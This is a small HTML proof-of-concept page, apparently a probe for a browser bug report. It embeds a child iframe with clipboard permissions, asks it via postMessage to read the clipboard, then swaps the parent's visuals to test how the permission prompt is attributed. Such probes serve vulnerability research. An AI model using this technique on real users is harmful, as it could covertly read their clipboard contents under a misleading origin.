
<!doctype html>
<meta charset="utf-8">
<title>clipboard iframe attribution probe</title>
<style>
  body { font: 18px system-ui, sans-serif; margin: 24px; }
  button, input { font: inherit; margin: 6px; }
  iframe { width: 96vw; height: 45vh; border: 2px solid #444; }
  pre { white-space: pre-wrap; border-top: 1px solid #999; padding-top: 10px; }
</style>
<h1>clipboard iframe attribution probe</h1>
<label>Child URL <input id="child" size="80" value="https://victimjodyritonga-create.github.io/victim/luffy.html"></label><br>
<button id="run" autofocus>Child reads clipboard, then replace visual</button>
<div id="slot"></div>
<pre id="log"></pre>
<script>
const logEl = document.getElementById('log');
let frame;
function log(message) { logEl.textContent += `${new Date().toISOString()} ${message}\n`; }
function load() {
  frame = document.createElement('iframe');
  frame.allow = 'clipboard-read; clipboard-write';
  frame.src = document.getElementById('child').value;
  document.getElementById('slot').replaceChildren(frame);
  log(`loaded child ${frame.src}`);
}
function run() {
  if (!frame) load();
  frame.contentWindow.postMessage({cmd: 'clipboard'}, '*');
  log('posted clipboard request to child');
  setTimeout(() => {
    document.body.style.background = '#ffd43b';
    document.querySelector('h1').textContent = 'PARENT VISUAL REPLACED AFTER CHILD CLIPBOARD REQUEST';
    log('parent visual replaced');
  }, 300);
}
document.getElementById('run').onclick = run;
window.addEventListener('message', event => log(`child: ${JSON.stringify(event.data)}`));
load();
</script>
